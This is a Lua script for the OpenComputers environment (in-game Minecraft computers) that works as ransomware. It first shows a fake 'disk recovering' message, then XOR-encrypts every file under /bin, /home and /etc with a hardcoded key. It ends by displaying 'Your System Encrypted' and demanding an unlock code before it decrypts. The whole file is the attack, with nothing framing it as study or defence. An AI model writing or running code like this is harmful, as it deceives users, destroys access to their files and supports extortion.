local fs = require("filesystem")
local cmp = require("component")
local gpu = cmp.gpu
local computer = require("computer")
local io = require("io")

gpu.setBackground(0x000000)
gpu.setForeground(0xFFFFFF)
gpu.fill(1, 1, 160, 50, " ")
gpu.set(1, 1, "Wait disk recovering...")

local paths = {"/bin", "/home", "/etc"}
local key = "7839"

local function xorCipher(data, key)
    local result = {}
    local keyLen = #key
    for i = 1, #data do
        local byte = string.byte(data, i)
        local keyByte = string.byte(key, (i - 1) % keyLen + 1)
        result[i] = string.char(byte ~ keyByte) -- Используем `~` для XOR
    end
    return table.concat(result)
end


local function encryptFile(path)
    local file, err = io.open(path, "rb")
    if not file then return false, err end
    local data = file:read("*a")
    file:close()
    local encrypted = xorCipher(data, key)
    file, err = io.open(path, "wb")
    if not file then return false, err end
    file:write(encrypted)
    file:close()
    return true
end

local function decryptFile(path)
    local file, err = io.open(path, "rb")
    if not file then return false, err end
    local data = file:read("*a")
    file:close()
    local decrypted = xorCipher(data, key)
    file, err = io.open(path, "wb")
    if not file then return false, err end
    file:write(decrypted)
    file:close()
    return true
end

local function processDir(dir, encrypt)
    for file in fs.list(dir) do
        local fullPath = fs.concat(dir, file)
        if fs.isDirectory(fullPath) then
            processDir(fullPath, encrypt)
        else
            if encrypt then
                encryptFile(fullPath)
            else
                decryptFile(fullPath)
            end
        end
    end
end

local function main()
    local encrypt = true -- Автошифрование при запуске
    for _, path in ipairs(paths) do
        if fs.exists(path) then
            processDir(path, encrypt)
        end
    end
end

main()

gpu.setBackground(0x000000)
gpu.setForeground(0xFFFFFF)
gpu.fill(1, 1, 160, 50, " ")
gpu.set(5, 1, "!!!Warning!!!")
gpu.set(3, 2, "Your System Encrypted")

local function passsys()
    io.write("Enter unlock code to decrypt: ")
    local inputKey = io.read()
    if inputKey == key then
        for _, path in ipairs(paths) do
            if fs.exists(path) then
                processDir(path, false)
            end
        end
        print("System unlocked!")
    else
        print("Incorrect code. System remains encrypted.")
        passsys()
    end
end

passsys()
